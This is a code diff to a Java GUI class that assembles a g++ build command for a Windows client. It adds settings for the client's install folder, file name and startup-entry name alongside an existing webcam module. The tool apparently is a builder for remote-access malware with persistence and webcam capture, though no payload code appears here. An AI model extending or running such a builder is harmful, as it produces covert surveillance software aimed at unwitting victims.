@@ -14,12 +14,14 @@ public class Compiler implements ActionListener {
     private final JDialog compilerDialog;
     private final JCheckBox[] checkBoxes;
     private final JTextField[] fieldsArray;
+    private final ButtonGroup buttonGroup;
 
 
-    public Compiler(JDialog compilerDialog, JCheckBox[] checkBoxesArray, JTextField[] fieldsArray) {
+    public Compiler(JDialog compilerDialog, JCheckBox[] checkBoxesArray, JTextField[] fieldsArray, ButtonGroup buttonGroup) {
         this.compilerDialog = compilerDialog;
         this.checkBoxes = checkBoxesArray;
         this.fieldsArray = fieldsArray;
+        this.buttonGroup = buttonGroup;
     }
 
     // Creating command line for compiling with g++, several options to include on the client
@@ -62,6 +64,15 @@ public class Compiler implements ActionListener {
                     "state/SystemState.cpp +" +
                     "install/Install.cpp ");
             if (checkBoxes[0].isSelected()) {
+                modifier.setInstallationPath(buttonGroup.getSelection().getActionCommand());
+                modifier.setSubdirectoryName(fieldsArray[6].getText());
+                modifier.setSubdirectoryFileName(fieldsArray[7].getText());
+                modifier.setStartUpName(checkBoxes[1].isSelected() ? fieldsArray[8].getText() : "");
+            } else {
+                modifier.setInstallationPath("-1");
+            }
+
+            if (checkBoxes[2].isSelected()) {
                 modifier.addInclude("#define WEBCAM");
                 command.append(
                         "webcam/WebcamManager.cpp " +
@@ -83,6 +94,7 @@ public class Compiler implements ActionListener {
                     " -lcomdlg32 -lwininet -static-libgcc " +
                     "-static-libstdc++ -Wl,-Bstatic -lstdc++ -lpthread -Wl,-Bdynamic -o ").append(
                     chooser.getSelectedFile().getAbsolutePath());
+
             modifier.writeToFile();
             System.out.println(command);
             compile(command.toString());
